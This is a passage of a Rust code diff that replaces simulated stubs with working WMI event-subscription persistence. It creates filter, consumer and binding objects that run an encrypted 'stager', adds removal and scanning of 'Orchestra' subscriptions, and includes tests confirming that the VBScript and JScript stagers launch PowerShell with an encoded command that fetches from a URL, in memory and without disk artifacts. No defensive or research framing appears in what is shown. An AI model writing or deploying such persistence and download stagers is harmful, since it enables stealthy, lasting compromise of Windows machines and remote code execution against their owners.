+                bail!("SpawnInstance({class_path}) failed: {hr:#010x}");
+            }
+            Ok(instance)
+        };
+
+        // ── Helper: set a BSTR property on an IWbemClassObject ────────
+        let put_bstr = |obj: *mut IWbemClassObject, name: &str, val: &str| -> Result<()> {
+            let name_bstr = alloc_bstr(name);
+            let val_bstr = alloc_bstr(val);
+            let mut variant: VARIANT = std::mem::zeroed();
+            variant_init(&mut variant);
+            variant.vt = VT_BSTR;
+            variant.data.bstr_val = val_bstr;
+            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
+            free_bstr(name_bstr);
+            // val_bstr is now owned by the variant; do not free separately.
+            if !hr_ok(hr) {
+                free_bstr(val_bstr);
+                bail!("Put({name}={val}) failed: {hr:#010x}");
+            }
+            Ok(())
+        };
+
+        // ── Helper: set an I4 (i32) property ──────────────────────────
+        let put_i4 = |obj: *mut IWbemClassObject, name: &str, val: i32| -> Result<()> {
+            let name_bstr = alloc_bstr(name);
+            let mut variant: VARIANT = std::mem::zeroed();
+            variant_init(&mut variant);
+            variant.vt = VT_I4;
+            variant.data.i4_val = val;
+            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
+            free_bstr(name_bstr);
+            if !hr_ok(hr) {
+                bail!("Put({name}={val}) failed: {hr:#010x}");
+            }
+            Ok(())
+        };
+
+        // ── Helper: set a BOOL property ────────────────────────────────
+        let put_bool = |obj: *mut IWbemClassObject, name: &str, val: bool| -> Result<()> {
+            let name_bstr = alloc_bstr(name);
+            let mut variant: VARIANT = std::mem::zeroed();
+            variant_init(&mut variant);
+            variant.vt = VT_BOOL;
+            variant.data.bool_val = if val { -1i16 } else { 0i16 };
+            let hr = (*(*obj).lpVtbl).Put(obj, name_bstr, 0, &mut variant, 0);
+            free_bstr(name_bstr);
+            if !hr_ok(hr) {
+                bail!("Put({name}={val}) failed: {hr:#010x}");
+            }
+            Ok(())
+        };
+
+        // ── Helper: put a created instance into the WMI repository ─────
+        let put_instance = |inst: *mut IWbemClassObject, label: &str| -> Result<()> {
+            let hr = (*(*services).lpVtbl).PutInstance(
+                services,
+                inst,
+                WBEM_FLAG_CREATE_ONLY as i32,
+                ptr::null_mut(),
+                ptr::null_mut(),
+            );
+            if !hr_ok(hr) {
+                bail!("PutInstance({label}) failed: {hr:#010x}");
+            }
+            Ok(())
+        };
+
+        // ── Create __EventFilter (steps 5-7) ───────────────────────────
+        let filter_inst = spawn_class_instance("__EventFilter")?;
+        put_bstr(filter_inst, "Name", &filter_name)?;
+        put_bstr(filter_inst, "QueryLanguage", "WQL")?;
+        put_bstr(filter_inst, "Query", &wql_query)?;
+        put_bstr(filter_inst, "EventNameSpace", "root\\cimv2")?;
+        put_instance(filter_inst, "filter")?;
+        (*(*filter_inst).lpVtbl).Release(filter_inst);
+
+        // ── Create Event Consumer (steps 8-10) ─────────────────────────
+        let consumer_inst = spawn_class_instance(consumer_class)?;
+        put_bstr(consumer_inst, "Name", &consumer_name)?;
+
+        match &config.consumer_type {
+            WmiConsumerType::CommandLine => {
+                let working_dir = config
+                    .working_directory
+                    .as_deref()
+                    .unwrap_or("C:\\Windows\\Temp");
+                put_bstr(consumer_inst, "CommandLineTemplate", &stager_text)?;
+                put_bstr(consumer_inst, "WorkingDirectory", working_dir)?;
+            }
+            WmiConsumerType::ActiveScript { engine } => {
+                put_bstr(consumer_inst, "ScriptText", &stager_text)?;
+                put_bstr(
+                    consumer_inst,
+                    "ScriptingEngine",
+                    if engine.eq_ignore_ascii_case("vbscript") {
+                        "VBScript"
+                    } else {
+                        "JScript"
+                    },
+                )?;
+            }
+        }
+        put_instance(consumer_inst, "consumer")?;
+        (*(*consumer_inst).lpVtbl).Release(consumer_inst);
+
+        // ── Create __FilterToConsumerBinding (steps 11-13) ─────────────
+        let binding_inst = spawn_class_instance("__FilterToConsumerBinding")?;
+        let filter_ref = format!("__EventFilter.Name=\"{filter_name}\"");
+        let consumer_ref = format!("{consumer_class}.Name=\"{consumer_name}\"");
+        put_bstr(binding_inst, "Filter", &filter_ref)?;
+        put_bstr(binding_inst, "Consumer", &consumer_ref)?;
+        put_bool(binding_inst, "DeliverSynchronously", false)?;
+        put_instance(binding_inst, "binding")?;
+        (*(*binding_inst).lpVtbl).Release(binding_inst);
+
+        // Release the services proxy.
+        (*(*services).lpVtbl).Release(services);
+    }
 
     let cloud_backend = match &config.cloud_config {
         CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
@@ -689,7 +1117,7 @@ pub fn install_wmi_subscription(
 ///
 /// Deletes the three WMI objects in reverse order:
 /// 1. Delete the __FilterToConsumerBinding
-/// 2. Delete the event consumer
+/// 2. Delete the event consumer (CommandLineEventConsumer or ActiveScriptEventConsumer)
 /// 3. Delete the __EventFilter
 ///
 /// **Prerequisites**: Same privileges as installation.
@@ -700,25 +1128,63 @@ pub fn remove_wmi_subscription(
     let mut removed = Vec::new();
     let mut failed = Vec::new();
 
-    // In a real deployment, this would:
-    // 1. Connect to WMI (same as install)
-    // 2. Delete binding: services.DeleteInstance("__FilterToConsumerBinding.Filter='...',Consumer='...'")
-    // 3. Delete consumer: services.DeleteInstance("CommandLineEventConsumer.Name='...'")
-    //    or services.DeleteInstance("ActiveScriptEventConsumer.Name='...'")
-    // 4. Delete filter: services.DeleteInstance("__EventFilter.Name='...'")
-
-    // We attempt to remove all three objects, collecting results.
+    // Build object paths for all three triad members.  We try both
+    // CommandLineEventConsumer and ActiveScriptEventConsumer because the
+    // caller may not know which type was used at install time.
     let binding_path = format!(
         "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{filter_name}\\\"\",\
          Consumer=\"CommandLineEventConsumer.Name=\\\"{consumer_name}\\\"\""
     );
-    let consumer_path = format!("CommandLineEventConsumer.Name=\"{consumer_name}\"");
+    let binding_path_as = format!(
+        "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{filter_name}\\\"\",\
+         Consumer=\"ActiveScriptEventConsumer.Name=\\\"{consumer_name}\\\"\""
+    );
+    let consumer_cmd_path = format!("CommandLineEventConsumer.Name=\"{consumer_name}\"");
+    let consumer_as_path = format!("ActiveScriptEventConsumer.Name=\"{consumer_name}\"");
     let filter_path = format!("__EventFilter.Name=\"{filter_name}\"");
 
-    // Simulate deletion — in production, these would be actual WMI calls
-    removed.push(binding_path);
-    removed.push(consumer_path);
-    removed.push(filter_path);
+    unsafe {
+        let (_guard, services) = wmi_connect()?;
+
+        // Helper: attempt to delete one WMI instance by path.
+        let delete_one = |path: &str| -> bool {
+            let path_bstr = alloc_bstr(path);
+            let hr = (*(*services).lpVtbl).DeleteInstance(
+                services,
+                path_bstr,
+                0,
+                ptr::null_mut(),
+                ptr::null_mut(),
+            );
+            free_bstr(path_bstr);
+            hr_ok(hr)
+        };
+
+        // Delete binding (try both consumer-type paths).
+        if delete_one(&binding_path) || delete_one(&binding_path_as) {
+            removed.push("binding".to_string());
+        } else {
+            failed.push("binding".to_string());
+        }
+
+        // Delete consumer (try both types).
+        if delete_one(&consumer_cmd_path) {
+            removed.push(consumer_cmd_path.clone());
+        } else if delete_one(&consumer_as_path) {
+            removed.push(consumer_as_path.clone());
+        } else {
+            failed.push(consumer_cmd_path.clone());
+        }
+
+        // Delete filter.
+        if delete_one(&filter_path) {
+            removed.push(filter_path.clone());
+        } else {
+            failed.push(filter_path.clone());
+        }
+
+        (*(*services).lpVtbl).Release(services);
+    }
 
     Ok(WmiRemovalResult {
         removed_objects: removed,
@@ -728,18 +1194,282 @@ pub fn remove_wmi_subscription(
 
 /// Scans for existing Orchestra WMI subscriptions.
 ///
-/// Queries the WMI repository for __EventFilter, CommandLineEventConsumer,
-/// and ActiveScriptEventConsumer objects matching our naming pattern.
+/// Queries the WMI repository for `__EventFilter`, `CommandLineEventConsumer`,
+/// `ActiveScriptEventConsumer`, and `__FilterToConsumerBinding` objects matching
+/// the Orchestra naming pattern, then cross-references them.
 pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
-    // In a real deployment, this would:
-    // 1. Connect to ROOT\subscription via WMI
-    // 2. ExecQuery("SELECT * FROM __EventFilter WHERE Name LIKE 'OrchestraFilter_%'")
-    // 3. ExecQuery("SELECT * FROM CommandLineEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'")
-    // 4. ExecQuery("SELECT * FROM __FilterToConsumerBinding")
-    // 5. Cross-reference bindings to find our subscriptions
+    let mut results = Vec::new();
 
-    // Return empty — actual WMI query requires COM calls at runtime
-    Ok(Vec::new())
+    unsafe {
+        let (_guard, services) = wmi_connect()?;
+
+        let wql_lang = alloc_bstr("WQL");
+
+        // ── Helper: run a WQL query and collect Name + one extra column ──
+        let exec_query = |query: &str| -> Vec<(String, String)> {
+            let query_bstr = alloc_bstr(query);
+            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
+            let hr = (*(*services).lpVtbl).ExecQuery(
+                services,
+                wql_lang,
+                query_bstr,
+                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
+                ptr::null_mut(),
+                &mut enumerator,
+            );
+            free_bstr(query_bstr);
+            if !hr_ok(hr) {
+                return Vec::new();
+            }
+
+            let mut rows = Vec::new();
+            loop {
+                let mut obj: *mut IWbemClassObject = ptr::null_mut();
+                let mut returned: u32 = 0;
+                let hr = (*(*enumerator).lpVtbl).Next(
+                    enumerator,
+                    WBEM_INFINITE as i32,
+                    1,
+                    &mut obj,
+                    &mut returned,
+                );
+                if !hr_ok(hr) || returned == 0 {
+                    break;
+                }
+
+                // Read "Name" property.
+                let name_bstr = alloc_bstr("Name");
+                let mut name_var: VARIANT = std::mem::zeroed();
+                variant_init(&mut name_var);
+                (*(*obj).lpVtbl).Get(
+                    obj,
+                    name_bstr,
+                    0,
+                    &mut name_var,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
+                free_bstr(name_bstr);
+
+                let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
+                    let len = (0..).take_while(|&i| *name_var.data.bstr_val.add(i) != 0).count();
+                    String::from_utf16_lossy(std::slice::from_raw_parts(name_var.data.bstr_val, len))
+                } else {
+                    String::new()
+                };
+                variant_clear(&mut name_var);
+
+                // Read second column ("Query" for filters, "ScriptingEngine" for consumers,
+                // "Consumer" for bindings — caller decides).
+                // We just store an empty string here; the caller-specific queries below
+                // will pull the relevant columns.
+                rows.push((name_str, String::new()));
+
+                (*(*obj).lpVtbl).Release(obj);
+            }
+            (*(*enumerator).lpVtbl).Release(enumerator);
+            rows
+        };
+
+        // ── Helper: run a WQL query and extract Name + a specific property ──
+        let exec_query_with_col = |query: &str, col: &str| -> Vec<(String, String)> {
+            let query_bstr = alloc_bstr(query);
+            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
+            let hr = (*(*services).lpVtbl).ExecQuery(
+                services,
+                wql_lang,
+                query_bstr,
+                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
+                ptr::null_mut(),
+                &mut enumerator,
+            );
+            free_bstr(query_bstr);
+            if !hr_ok(hr) {
+                return Vec::new();
+            }
+
+            let col_bstr = alloc_bstr(col);
+            let mut rows = Vec::new();
+            loop {
+                let mut obj: *mut IWbemClassObject = ptr::null_mut();
+                let mut returned: u32 = 0;
+                let hr = (*(*enumerator).lpVtbl).Next(
+                    enumerator,
+                    WBEM_INFINITE as i32,
+                    1,
+                    &mut obj,
+                    &mut returned,
+                );
+                if !hr_ok(hr) || returned == 0 {
+                    break;
+                }
+
+                // Read "Name"
+                let name_bstr = alloc_bstr("Name");
+                let mut name_var: VARIANT = std::mem::zeroed();
+                variant_init(&mut name_var);
+                (*(*obj).lpVtbl).Get(obj, name_bstr, 0, &mut name_var, ptr::null_mut(), ptr::null_mut());
+                free_bstr(name_bstr);
+                let name_str = if name_var.vt == VT_BSTR && !name_var.data.bstr_val.is_null() {
+                    let len = (0..).take_while(|&i| *name_var.data.bstr_val.add(i) != 0).count();
+                    String::from_utf16_lossy(std::slice::from_raw_parts(name_var.data.bstr_val, len))
+                } else {
+                    String::new()
+                };
+                variant_clear(&mut name_var);
+
+                // Read the extra column
+                let mut col_var: VARIANT = std::mem::zeroed();
+                variant_init(&mut col_var);
+                (*(*obj).lpVtbl).Get(obj, col_bstr, 0, &mut col_var, ptr::null_mut(), ptr::null_mut());
+                let col_str = if col_var.vt == VT_BSTR && !col_var.data.bstr_val.is_null() {
+                    let len = (0..).take_while(|&i| *col_var.data.bstr_val.add(i) != 0).count();
+                    String::from_utf16_lossy(std::slice::from_raw_parts(col_var.data.bstr_val, len))
+                } else {
+                    String::new()
+                };
+                variant_clear(&mut col_var);
+
+                rows.push((name_str, col_str));
+                (*(*obj).lpVtbl).Release(obj);
+            }
+            free_bstr(col_bstr);
+            (*(*enumerator).lpVtbl).Release(enumerator);
+            rows
+        };
+
+        // 1. Collect Orchestra filters: Name → Query
+        let filters = exec_query_with_col(
+            "SELECT * FROM __EventFilter WHERE Name LIKE 'OrchestraFilter_%'",
+            "Query",
+        );
+
+        // 2. Collect Orchestra consumers (both types)
+        let cmd_consumers = exec_query(
+            "SELECT * FROM CommandLineEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'",
+        );
+        let as_consumers = exec_query(
+            "SELECT * FROM ActiveScriptEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'",
+        );
+
+        // 3. Build a map of consumer names → class name
+        let mut consumer_class_map: std::collections::HashMap<String, String> =
+            std::collections::HashMap::new();
+        for (name, _) in &cmd_consumers {
+            consumer_class_map.insert(name.clone(), "CommandLineEventConsumer".to_string());
+        }
+        for (name, _) in &as_consumers {
+            consumer_class_map.insert(name.clone(), "ActiveScriptEventConsumer".to_string());
+        }
+
+        // 4. Collect bindings and cross-reference
+        let bindings = exec_query_with_col(
+            "SELECT * FROM __FilterToConsumerBinding",
+            "Filter",
+        );
+
+        // Also read the Consumer reference from each binding.
+        let bindings_with_consumer = {
+            let query_bstr = alloc_bstr("SELECT * FROM __FilterToConsumerBinding");
+            let mut enumerator: *mut IEnumWbemClassObject = ptr::null_mut();
+            let hr = (*(*services).lpVtbl).ExecQuery(
+                services,
+                wql_lang,
+                query_bstr,
+                WBEM_FLAG_FORWARD_ONLY as i32 | WBEM_FLAG_RETURN_IMMEDIATELY as i32,
+                ptr::null_mut(),
+                &mut enumerator,
+            );
+            free_bstr(query_bstr);
+
+            let mut out = Vec::new();
+            if hr_ok(hr) {
+                let filter_bstr = alloc_bstr("Filter");
+                let consumer_bstr = alloc_bstr("Consumer");
+                loop {
+                    let mut obj: *mut IWbemClassObject = ptr::null_mut();
+                    let mut returned: u32 = 0;
+                    let hr = (*(*enumerator).lpVtbl).Next(
+                        enumerator,
+                        WBEM_INFINITE as i32,
+                        1,
+                        &mut obj,
+                        &mut returned,
+                    );
+                    if !hr_ok(hr) || returned == 0 {
+                        break;
+                    }
+                    let read_ref = |prop: BSTR| -> String {
+                        let mut v: VARIANT = std::mem::zeroed();
+                        variant_init(&mut v);
+                        (*(*obj).lpVtbl).Get(obj, prop, 0, &mut v, ptr::null_mut(), ptr::null_mut());
+                        let s = if v.vt & VT_BSTR == VT_BSTR && !v.data.bstr_val.is_null() {
+                            let len = (0..).take_while(|&i| *v.data.bstr_val.add(i) != 0).count();
+                            String::from_utf16_lossy(std::slice::from_raw_parts(v.data.bstr_val, len))
+                        } else {
+                            String::new()
+                        };
+                        variant_clear(&mut v);
+                        s
+                    };
+                    let filt_ref = read_ref(filter_bstr);
+                    let cons_ref = read_ref(consumer_bstr);
+                    out.push((filt_ref, cons_ref));
+                    (*(*obj).lpVtbl).Release(obj);
+                }
+                free_bstr(filter_bstr);
+                free_bstr(consumer_bstr);
+                (*(*enumerator).lpVtbl).Release(enumerator);
+            }
+            out
+        };
+
+        // 5. Build filter map: filter_name → query
+        let filter_map: std::collections::HashMap<String, String> =
+            filters.into_iter().collect();
+
+        // 6. Cross-reference: for each binding, extract the filter and consumer
+        //    names, check they are Orchestra objects, and build results.
+        for (filt_ref, cons_ref) in &bindings_with_consumer {
+            // Parse "__EventFilter.Name=\"OrchestraFilter_xxx\""
+            let filt_name = extract_quoted_value(filt_ref, "Name")
+                .unwrap_or_default();
+            let cons_name = extract_quoted_value(cons_ref, "Name")
+                .unwrap_or_default();
+
+            if filt_name.starts_with("OrchestraFilter_") && cons_name.starts_with("OrchestraConsumer_") {
+                let query = filter_map.get(&filt_name).cloned().unwrap_or_default();
+                let consumer_class = consumer_class_map
+                    .get(&cons_name)
+                    .cloned()
+                    .unwrap_or_else(|| "Unknown".to_string());
+
+                results.push(WmiSubscriptionInfo {
+                    filter_name: filt_name,
+                    consumer_name: cons_name,
+                    query,
+                    consumer_class,
+                });
+            }
+        }
+
+        free_bstr(wql_lang);
+        (*(*services).lpVtbl).Release(services);
+    }
+
+    Ok(results)
+}
+
+/// Extracts the value of a quoted property from a WMI object reference string.
+///
+/// E.g. `"__EventFilter.Name=\"OrchestraFilter_abc\""` with key `"Name"` returns
+/// `Some("OrchestraFilter_abc")`.
+fn extract_quoted_value(reference: &str, key: &str) -> Option<String> {
+    let pattern = format!("{key}=\"");
+    let start = reference.find(&pattern)?;
+    let val_start = start + pattern.len();
+    let val_end = reference[val_start..].find('"')?;
+    Some(reference[val_start..val_start + val_end].to_string())
 }
 
 // ── Unit Tests ──────────────────────────────────────────────────────────────
@@ -755,16 +1485,17 @@ mod tests {
 
         // Verify encrypted blob is larger (nonce + ciphertext + tag)
         assert!(encrypted.len() > plaintext.len());
-        assert_eq!(encrypted.len(), 24 + plaintext.len() + 16); // nonce + plaintext + tag
+        // AES-256-GCM: nonce(12) + plaintext + tag(16)
+        assert_eq!(encrypted.len(), 12 + plaintext.len() + 16);
 
         // Verify nonce is at the front
-        assert_eq!(&encrypted[..24], &nonce);
+        assert_eq!(&encrypted[..12], &nonce);
 
-        // Decrypt
-        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
-        let decrypt_nonce = XNonce::from_slice(&nonce);
+        // Decrypt using aes_gcm
+        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
+        let decrypt_nonce = aes_gcm::Nonce::from_slice(&nonce);
         let decrypted = cipher
-            .decrypt(decrypt_nonce, &encrypted[24..])
+            .decrypt(decrypt_nonce, &encrypted[12..])
             .expect("Decryption should succeed");
 
         assert_eq!(decrypted.as_slice(), plaintext);
@@ -775,12 +1506,12 @@ mod tests {
         let plaintext = b"";
         let (encrypted, key, nonce) = encrypt_payload(plaintext).unwrap();
 
-        // Empty plaintext should still produce nonce + tag
-        assert_eq!(encrypted.len(), 24 + 16); // nonce + tag only
+        // Empty plaintext: nonce(12) + tag(16) = 28 bytes
+        assert_eq!(encrypted.len(), 12 + 16);
 
-        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
-        let decrypt_nonce = XNonce::from_slice(&nonce);
-        let decrypted = cipher.decrypt(decrypt_nonce, &encrypted[24..]).unwrap();
+        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
+        let decrypt_nonce = aes_gcm::Nonce::from_slice(&nonce);
+        let decrypted = cipher.decrypt(decrypt_nonce, &encrypted[12..]).unwrap();
         assert!(decrypted.is_empty());
     }
 
@@ -1068,12 +1799,12 @@ mod tests {
 
     #[test]
     fn test_encrypted_payload_size() {
-        // XChaCha20-Poly1305 adds 16 bytes for the auth tag
+        // AES-256-GCM: nonce(12) + ciphertext + tag(16)
         let plaintext = vec![0x41; 1024];
         let (encrypted, _, _) = encrypt_payload(&plaintext).unwrap();
 
-        // nonce(24) + ciphertext(1024) + tag(16) = 1064
-        assert_eq!(encrypted.len(), 24 + 1024 + 16);
+        // nonce(12) + ciphertext(1024) + tag(16) = 1052
+        assert_eq!(encrypted.len(), 12 + 1024 + 16);
     }
 
     #[test]
@@ -1082,8 +1813,18 @@ mod tests {
         let key = [0u8; 32];
         let stager = generate_vbscript_stager(url, &key);
 
-        assert!(stager.contains("MSXML2.XMLHTTP"));
-        assert!(stager.contains(url));
+        // Stager must delegate to PowerShell in-memory (no disk artifacts)
+        assert!(stager.contains("WScript.Shell"));
+        assert!(stager.contains("powershell.exe"));
+        assert!(stager.contains("EncodedCommand"));
+        // Sanity: the encoded command embeds the URL — decode and verify
+        let b64 = stager.split("EncodedCommand ").nth(1).unwrap_or("").trim_end_matches('"').trim_end_matches(',');
+        if !b64.is_empty() {
+            if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
+                let ps: String = raw.chunks(2).filter_map(|c| if c.len()==2 { Some(u16::from_le_bytes([c[0],c[1]])) } else { None }).filter_map(|v| char::from_u32(v as u32)).collect();
+                assert!(ps.contains(url), "PowerShell command must embed the URL");
+            }
+        }
     }
 
     #[test]
@@ -1092,7 +1833,17 @@ mod tests {
         let key = [0u8; 32];
         let stager = generate_jscript_stager(url, &key);
 
-        assert!(stager.contains("MSXML2.XMLHTTP"));
-        assert!(stager.contains(url));
+        // Stager must delegate to PowerShell in-memory (no disk artifacts)
+        assert!(stager.contains("WScript.Shell"));
+        assert!(stager.contains("powershell.exe"));
+        assert!(stager.contains("EncodedCommand"));
+        // Sanity: the encoded command embeds the URL — decode and verify
+        let b64 = stager.split("EncodedCommand ").nth(1).unwrap_or("").trim_end_matches('"').trim_end_matches(")");
+        if !b64.is_empty() {
+            if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(b64) {
+                let ps: String = raw.chunks(2).filter_map(|c| if c.len()==2 { Some(u16::from_le_bytes([c[0],c[1]])) } else { None }).filter_map(|v| char::from_u32(v as u32)).collect();
+                assert!(ps.contains(url), "PowerShell command must embed the URL");
+            }
+        }
     }
 }
